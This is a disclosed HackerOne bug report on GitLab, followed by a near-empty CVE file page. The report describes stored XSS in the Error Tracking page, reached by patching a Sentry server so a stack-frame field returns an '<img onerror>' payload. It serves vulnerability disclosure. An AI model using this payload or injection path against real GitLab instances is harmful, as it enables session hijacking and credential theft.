=== Content from gitlab.com_a03ec381_20250119_112807.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS on the Error Tracking page

**[HackerOne report #859888](https://hackerone.com/reports/859888)** by `mike12` on 2020-04-26, assigned to [@jeremymatos](/jeremymatos "Jeremy Matos"):

Hello Gitlab!

#### Steps to reproduce

1. Set up a Sentry server or **just use this server:** <http://REDACTED> .
   1. Install Sentry Server, use this [doc](https://docs.sentry.io/server/installation/)
   2. Connect to the Sentry container: `docker exec -it sentry_onpremise_web_1 /bin/bash`
   3. Install Vim: `apt update && apt install vim -y`
   4. Open `stacktrace.py` file: `vim /usr/local/lib/python2.7/site-packages/sentry/interfaces/stacktrace.py`
   5. Replace `"colNo": self.colno,` with `"colNo": "<img src=x onerror=alert(1)>",` on line 210

      ```
      def get_api_context(self, is_public=False, pad_addr=None, platform=None):
          from sentry.stacktraces.functions import get_function_name_for_frame

          function = get_function_name_for_frame(self, platform)
          data = {
              "filename": self.filename,
              "absPath": self.abs_path,
              "module": self.module,
              "package": self.package,
              "platform": self.platform,
              "instructionAddr": pad_hex_addr(self.instruction_addr, pad_addr),
              "symbolAddr": pad_hex_addr(self.symbol_addr, pad_addr),
              "function": function,
              "rawFunction": self.raw_function,
              "symbol": self.symbol,
              "context": get_context(
                  lineno=self.lineno,
                  context_line=self.context_line,
                  pre_context=self.pre_context,
                  post_context=self.post_context,
              ),
              "lineNo": self.lineno,
      -       "colNo": self.colno,
      +       "colNo": "<img src=x onerror=alert(1)>",
              "inApp": self.in_app,
              "trust": self.trust,
              "errors": self.errors,
          }
          if not is_public:
              data["vars"] = self.vars
      ```
   6. Exit from the container
   7. Restart the container: `docker restart sentry_onpremise_web_1`
   8. Create a new Sentry project, use this [doc](https://docs.sentry.io/guides/integrate-frontend/create-new-project/)
   9. Capture an error using Sentry SDK. Use docs: [Initialize Sentry SDK](https://docs.sentry.io/guides/integrate-frontend/initialize-sentry-sdk/) and [Capture your First Error](https://docs.sentry.io/guides/integrate-frontend/generate-first-error/)
   10. Generate a Sentry auth token, use this [doc](https://docs.sentry.io/api/auth/)
2. Run Gitlab: `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
3. Create a new Gitlab project
4. Go to `Settings->Operations->Error Tracking` and connect Sentry to the Gitlab project
   1. Check the "Active" checkbox
   2. Sentry API URL: <http://REDACTED:9000> (or your Sentry server URL)
   3. Auth Token: `REDACTED2` (or your Sentry auth token)
   4. Project: `Sentry | javascript` (or your Sentry project)
5. Go to `Operations->Error Tracking` and open details for an error.

[![1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/b8310f375a24d0f59aef44d4cdb15fbfe7831425/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33336435383037322d666131632d346130352d383339352d6338376137396534623536632f312e706e67)

[![2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3aeb7c64edbd68bda226a25d6be145ed81ec8dcd/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38376365323935322d623335332d346663662d383465352d3839373437396665326163322f322e706e67)

#### My GitLab version

```
root@gitlab:/# gitlab-rake gitlab:env:info

System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.26.2
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.10.1
Revision:	e658772bd63
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data
3. Steal user's credentials

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [2.png](https://h1.sec.gitlab.net/a/87ce2952-b353-4fcf-84e5-897479fe2ac2/2.png)
* [1.png](https://h1.sec.gitlab.net/a/33d58072-fa1c-4a05-8395-c87a79e4b56c/1.png)

Edited Aug 03, 2020 by [Jeremy Matos](/jeremymatos)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_4c1bdb52_20250119_112806.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2020](/gitlab-org/cves/-/tree/master/2020)
* [**CVE-2020-13336.json**](/gitlab-org/cves/-/blob/master/2020/CVE-2020-13336.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2020/CVE-2020-13336.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2020/CVE-2020-13336.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Sep 29, 2020

  [bb6ab2df](/gitlab-org/cves/-/commit/bb6ab2df8393a802da4c9f3eaba7b5a653f425a7)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/bb6ab2df8393a802da4c9f3eaba7b5a653f425a7)
  ·
  bb6ab2df

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Sep 29, 2020

  bb6ab2df

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/bb6ab2df8393a802da4c9f3eaba7b5a653f425a7)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Sep 29, 2020

Loading


